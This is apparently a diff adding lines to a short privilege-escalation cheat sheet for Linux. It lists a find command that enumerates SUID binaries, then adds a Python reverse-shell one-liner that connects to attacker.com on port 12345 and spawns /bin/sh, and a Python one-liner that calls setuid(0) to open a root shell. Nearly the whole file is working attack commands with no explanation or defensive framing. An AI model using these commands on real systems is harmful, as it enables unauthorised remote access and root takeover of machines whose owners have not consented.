@@ -1,2 +1,13 @@
 find / -perm -4000 -type f 2>/dev/null
 //finding files with suid
+
+
+
+
+/usr/bin/python3.8 -c 'import sys,socket,os,pty;s=socket.socket()
+s.connect(("attacker.com",12345))
+[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
+pty.spawn("/bin/sh")'
+
+
+python3.8 -c 'import os; os.setuid(0); os.execl("/bin/sh", "sh")'
